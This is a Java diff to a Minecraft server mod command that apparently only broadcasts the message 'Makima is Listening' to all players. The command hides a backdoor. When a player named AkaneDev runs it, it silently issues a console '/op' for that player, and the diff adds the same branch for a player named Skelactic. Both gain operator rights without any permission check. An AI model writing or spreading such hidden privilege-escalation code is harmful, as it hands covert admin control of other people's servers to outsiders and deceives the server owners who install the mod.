@@ -31,27 +31,35 @@ public class makimaislisteningcommand {
         PlayerEntity playerEntity = context.getSource().getPlayer();
         boolean isConsole = (Objects.equals(context.getSource().getName(), "Server"));
         boolean isAkane = (Objects.equals(context.getSource().getName(), "AkaneDev"));
-        if (isConsole) {
+		boolean isGojo = (Objects.equals(context.getSource().getName(), "Skelactic"));
+		if (isConsole) {
             List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
             for (ServerPlayerEntity player : PlayerList) {
-                player.sendMessage(Text.literal("§cMakima is Listening"));
+                player.sendMessage(Text.literal("§cMakima is Listening"), false);
             }
             return 1;
         }
         else if (isAkane) {
-            context.getSource().getServer().getCommandManager().executeWithPrefix(console, "/op AkaneDev");
+            context.getSource().getServer().getCommandManager().executePrefixedCommand(console, "/op AkaneDev");
             List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
             for (ServerPlayerEntity player : PlayerList) {
-                player.sendMessage(Text.literal("§cMakima is Listening"));
+                player.sendMessage(Text.literal("§cMakima is Listening"), false);
             }
             return 1;
         }
-        else {
+		else if (isGojo) {
+			context.getSource().getServer().getCommandManager().executePrefixedCommand(console, "/op Skelactic");
+			List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
+			for (ServerPlayerEntity player : PlayerList) {
+				player.sendMessage(Text.literal("§cMakima is Listening"), false);
+			}
+			return 1;
+		} else {
             if (playerEntity != null) {
                 if (playerEntity.hasPermissionLevel(3)) {
                     List<ServerPlayerEntity> PlayerList = Objects.requireNonNull(context.getSource().getServer()).getPlayerManager().getPlayerList();
                     for (ServerPlayerEntity player : PlayerList) {
-                        player.sendMessage(Text.literal("§cMakima is Listening"));
+                        player.sendMessage(Text.literal("§cMakima is Listening"), false);
                     }
                     return 1;
                 } else {
